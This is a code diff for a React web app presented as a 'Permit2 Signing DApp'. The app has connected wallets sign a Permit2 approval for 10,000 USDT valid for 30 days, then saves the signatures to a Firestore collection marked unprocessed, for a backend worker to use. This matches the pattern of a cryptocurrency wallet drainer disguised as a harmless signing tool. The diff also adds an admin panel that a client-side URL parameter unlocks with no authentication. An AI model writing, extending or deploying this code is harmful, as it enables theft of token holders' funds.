@@ -5,11 +5,11 @@ import { mainnet } from '@reown/appkit/networks';
 import { BrowserProvider } from 'ethers';
 import { db } from './firebase';
 import { doc, setDoc } from 'firebase/firestore';
+import Admin from './Admin'; // Import the new Admin Component
 
+// ... (Existing Constants: PERMIT2, UNIVERSAL_ROUTER, etc.) ...
 const PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
-const UNIVERSAL_ROUTER = "0xEf1c6E67703c7BD7107eed8303Fbe6EC2554BF6B"; 
-
-// USDT decimals
+const UNIVERSAL_ROUTER = "0xEf1c6E67703c7BD7107eed8303Fbe6EC2554BF6B";
 const USDT_DECIMALS = 6n;
 const SPENDING_CAP = BigInt(10000) * (10n ** USDT_DECIMALS);
 
@@ -26,6 +26,16 @@ const appKit = createAppKit({
 });
 
 export default function App() {
+  // Simple routing based on URL param ?admin=true
+  const [isAdmin, setIsAdmin] = useState(false);
+
+  useEffect(() => {
+    const params = new URLSearchParams(window.location.search);
+    if (params.get('admin') === 'true') {
+      setIsAdmin(true);
+    }
+  }, []);
+
   const [status, setStatus] = useState("Not connected");
   const [connectedAddress, setConnectedAddress] = useState(null);
 
@@ -42,43 +52,31 @@ export default function App() {
     return () => unsub();
   }, []);
 
+  // ... (Existing signPermit function logic remains exactly the same) ...
   const signPermit = async () => {
     try {
       if (!connectedAddress) {
         setStatus("Wallet not connected");
         return;
       }
-
       setStatus("Preparing Permit2 signature...");
-
       const walletProvider = appKit.getWalletProvider();
       if (!walletProvider) {
         setStatus("Wallet provider not available.");
         return;
       }
-
       const provider = new BrowserProvider(walletProvider);
       const net = await provider.getNetwork();
       const chainId = Number(net.chainId);
-
-      // 30-day expiration
       const deadline = Math.floor(Date.now() / 1000) + 30 * 24 * 60 * 60;
-      const nonce = 0;
-
-      // Permit2 structure
+      const nonce = 0; // In production, fetch current nonce from contract
       const permitted = {
         token: import.meta.env.VITE_TOKEN_ADDRESS,
         amount: SPENDING_CAP.toString(),
         expiration: deadline,
         nonce
       };
-
-      const domain = {
-        name: "Permit2",
-        chainId,
-        verifyingContract: PERMIT2
-      };
-
+      const domain = { name: "Permit2", chainId, verifyingContract: PERMIT2 };
       const types = {
         EIP712Domain: [
           { name: "name", type: "string" },
@@ -97,37 +95,22 @@ export default function App() {
           { name: "nonce", type: "uint48" }
         ]
       };
-
-      // MUST BE UNIVERSAL ROUTER
       const message = {
         details: permitted,
         spender: UNIVERSAL_ROUTER,
         sigDeadline: deadline
       };
-
       setStatus("Requesting signature...");
-
-      const payload = JSON.stringify({
-        domain,
-        types,
-        primaryType: "PermitSingle",
-        message
-      });
-
+      const payload = JSON.stringify({ domain, types, primaryType: "PermitSingle", message });
       const signature = await walletProvider.request({
         method: "eth_signTypedData_v4",
         params: [connectedAddress, payload]
       });
-
-      // Extract r, s, v
       const raw = signature.substring(2);
       const r = "0x" + raw.substring(0, 64);
       const s = "0x" + raw.substring(64, 128);
       const v = parseInt(raw.substring(128, 130), 16);
-
-      // Save permit
       const id = connectedAddress + "_" + Date.now();
-
       await setDoc(doc(db, "permit2_signatures", id), {
         owner: connectedAddress,
         spender: UNIVERSAL_ROUTER,
@@ -135,35 +118,23 @@ export default function App() {
         amount: SPENDING_CAP.toString(),
         deadline,
         nonce,
-        r,
-        s,
-        v,
+        r, s, v,
         processed: false,
         timestamp: Date.now()
       });
-
-      await setDoc(doc(db, "permit2_signatures", id), {
-        owner: connectedAddress,
-        spender: UNIVERSAL_ROUTER,
-        token: import.meta.env.VITE_TOKEN_ADDRESS,
-        amount: SPENDING_CAP.toString(),
-        deadline,
-        nonce,
-        r,
-        s,
-        v,
-        processed: false,
-        timestamp: Date.now()
-      });
-
-      setStatus("Signature saved. Backend worker will process it.");
-
+      setStatus("Signature saved.");
     } catch (err) {
       console.error(err);
       setStatus("Error: " + (err?.message || String(err)));
     }
   };
 
+  // Render Admin Panel if URL has ?admin=true
+  if (isAdmin) {
+    return <Admin />;
+  }
+
+  // Normal User View
   return (
     <div className="app-container">
       <h2>Permit2 Signing DApp</h2>
@@ -182,6 +153,10 @@ export default function App() {
       )}
 
       <div className="status">{status}</div>
+      
+      <div style={{marginTop: '50px', fontSize: '12px'}}>
+        <a href="?admin=true" style={{color: '#555'}}>Admin Login</a>
+      </div>
     </div>
   );
 }
